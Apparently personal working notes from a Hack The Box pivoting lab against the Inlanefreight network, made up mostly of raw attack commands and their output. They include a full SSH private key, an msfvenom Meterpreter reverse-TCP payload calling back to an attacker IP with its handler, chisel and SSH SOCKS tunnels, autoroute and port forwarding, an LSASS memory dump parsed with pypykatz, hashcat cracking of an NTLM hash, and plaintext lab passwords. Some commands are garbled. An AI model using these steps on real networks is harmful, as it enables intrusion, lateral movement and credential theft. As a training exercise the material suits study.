# Objectives 

- Start from external (Pwnbox or your own VM) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the Inlanefreight Domain Controller and capture the associated flag.
- Use any data, credentials, scripts, or other information within the environment to enable your pivoting attempts.
- Grab any/all flags that can be found.



nmap 10.129.200.0/24 -sn -oA tnet | grep for | cut -d" " -f5

10.129.200.12
10.129.200.170

nmap 10.129.200.0/21 -sn -oA tnet | grep for | cut -d" " -f5
10.129.200.12
10.129.200.170
10.129.201.127
10.129.202.41
10.129.202.64
10.129.202.99
10.129.202.137
10.129.203.7
10.129.203.52
10.129.203.65
10.129.203.105
10.129.203.112
10.129.203.114
10.129.204.182
10.129.205.42

vi hosts.lst
nmap -sV -oA nmap -iL hosts.lst --stats-every=5s

nmap -sV -oA nmap $TARGET --stats-every=5s

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds


-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

chmod 600 /home/htb-ac-786011/id_rsa

scp -i /home/htb-ac-786011/id_rsa chisel webadmin@$TARGET:~/

ssh -i /home/htb-ac-786011/id_rsa webadmin@$TARGET

git clone https://github.com/jpillora/chisel.git
cd chisel
go build

./chisel server -v -p 1234 --socks5
2023/11/26 15:43:01 server: Fingerprint CcZbdZAwxzUFy6VOTU44xSh7TJlR/o+VI7UBDrCcsx8=
2023/11/26 15:43:01 listen tcp 0.0.0.0:1234: bind: address already in use

cd chisel/
./chisel client -v $TARGET:1234 socks

sudo vi /etc/proxychains.conf
MAJ+G
\# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080

proxychains nmap -sV -sT 10.129.200.0/21 --stats-every=5s

--> FAILED

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.103 -f elf -o backupjob LPORT=8080
msfconsole
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run

scp -i /home/htb-ac-786011/id_rsa backupjob webadmin@$TARGET:~/
ssh -i /home/htb-ac-786011/id_rsa webadmin@$TARGET
chmod 777 backupjob
./backupjob

(Meterpreter 1)(/home/webadmin) > pwd
/home/webadmin

run post/multi/gather/ping_sweep RHOSTS=10.129.200.0/21
[*] Performing ping sweep for IP range 10.129.200.0/21

[+] 	10.129.201.57 host found
[+] 	10.129.201.55 host found
[+] 	10.129.201.88 host found
[+] 	10.129.201.96 host found
[+] 	10.129.201.101 host found
[+] 	10.129.201.127 host found
[+] 	10.129.201.234 host found
[+] 	10.129.202.41 host found
[+] 	10.129.202.64 host found
[+] 	10.129.202.120 host found
[+] 	10.129.203.118 host found

use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run

socks4 	127.0.0.1 9050

run autoroute -s 10.129.200.0/21

run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.200.0       255.255.248.0      Session 1

proxychains nmap -sV -sT 10.129.200.0/21 --stats-every=5s

ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.15  netmask 255.255.0.0

run post/multi/gather/ping_sweep RHOSTS=172.16.0.0/16

run autoroute -s 172.16.0.0/16
run autoroute -p

proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

portfwd add -l 3300 -p 3389 -r 172.16.5.19
xfreerdp /v:localhost:3300 /u:mlefay /p:"Plain Human work!"

-> FAILED

xfreerdp /v:172.16.5.19 /u:mlefay /p:"Plain Human work!"

run post/multi/gather/ping_sweep RHOSTS=172.16.5.35

[*] Performing ping sweep for IP range 172.16.5.35
[+] 	172.16.5.35 host found

proxychains nmap 172.16.5.35 -p3389 -sT -v -Pn
nmap -sV -sC $TARGET -p3389 --script rdp*



PORT     STATE  SERVICE
3389/tcp closed ms-wbt-server

-> FAILED



DYNAMIC PORT FORWARDING :

vi /home/htb-ac-786011/id_rsa
chmod 600 /home/htb-ac-786011/id_rsa
ssh -D 9050 -i /home/htb-ac-786011/id_rsa webadmin@$TARGET
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:"Plain Human work!" /drive:linux,/home/ /dynamic-resolution


proxychains nmap -v -sn 172.16.5.35 -p3389 -sT -v -Pn

proxychains msfconsole
search rdp_scanner
auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.35
run

[*] 172.16.5.35:3389      - Detected RDP on 172.16.5.35:3389      (name:PIVOT-SRV01) (domain:INLANEFREIGHT) (domain_fqdn:INLANEFREIGHT.LOCAL) (server_fqdn:PIVOT-SRV01.INLANEFREIGHT.LOCAL) (os_version:10.0.17763) (Requires NLA: Yes)

proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:"Plain Human work!" /drive:linux,/home/ /dynamic-resolution

Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

-> C:\Users\mlefay\AppData\Local\Temp\lsass.DMP

Copy/Paste lsass.DMP to \\tsclient\linux\htb-ac-786011

pypykatz lsa minidump lsass.DMP

wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
unzip SocksOverRDP-x64.zip 
Archive:  SocksOverRDP-x64.zip
  inflating: SocksOverRDP-Plugin.dll  
  inflating: SocksOverRDP-Server.exe  


wget https://www.proxifier.com/download/ProxifierPE.zip
unzip ProxifierPE.zip 
Archive:  ProxifierPE.zip
   creating: Proxifier PE/
  inflating: Proxifier PE/Helper64.exe  
  inflating: Proxifier PE/Proxifier.exe  
  inflating: Proxifier PE/ProxyChecker.exe  
  inflating: Proxifier PE/PrxDrvPE.dll  
  inflating: Proxifier PE/PrxDrvPE64.dll

proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:"Plain Human work!" /drive:linux,/home/ /dynamic-resolution

DLL in Register Server SocksOverRDP-Plugin.dll succedded

proxychains msfconsole
search rdp_scanner
set rhosts 172.16.5.0/18
run

proxychains nmap -v -sn 172.16.5.1-200

1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

webadmin@inlanefreight:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.014 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.645 ms

for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

C:\Windows\system32>ping 172.16.5.15 -n 1 -w 100   | find "Reply"
Reply from 172.16.5.15: bytes=32 time<1ms TTL=64

C:\Windows\system32>ping 172.16.5.35 -n 1 -w 100   | find "Reply"
Reply from 172.16.5.35: bytes=32 time<1ms TTL=128

for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"

C:\Windows\system32>ping 172.16.6.35 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.35: bytes=32 time<1ms TTL=128

172.16.6.35
inlanefreight.local\vfrank
Imply wet Unmasked!

sudo hashcat -m 1000 2e16a00be74fa0bf862b4256d0347e83 /usr/share/wordlists/rockyou.txt

netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=172.16.5.15 connectport=3389 connectaddress=172.16.6.35
netsh.exe interface portproxy show v4tov4
proxychains xfreerdp /u:mlefay /p:"Plain Human work!" /v:$172.16.6.35:8080

C:\Users\mlefay>ping 172.16.6.25 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.25: bytes=32 time<1ms TTL=128

C:\Users\mlefay>ping 172.16.6.45 -n 1 -w 100   | find "Reply"
Reply from 172.16.6.45: bytes=32 time=1ms TTL=64

C:\Windows\system32>nslookup
DNS request timed out.
    timeout was 2 seconds.
Default Server:  UnKnown
Address:  172.16.10.5

> set type=all
> _ldap._tcp.dc._msdcs.DOMAIN_NAME
Server:  UnKnown
Address:  172.16.10.5
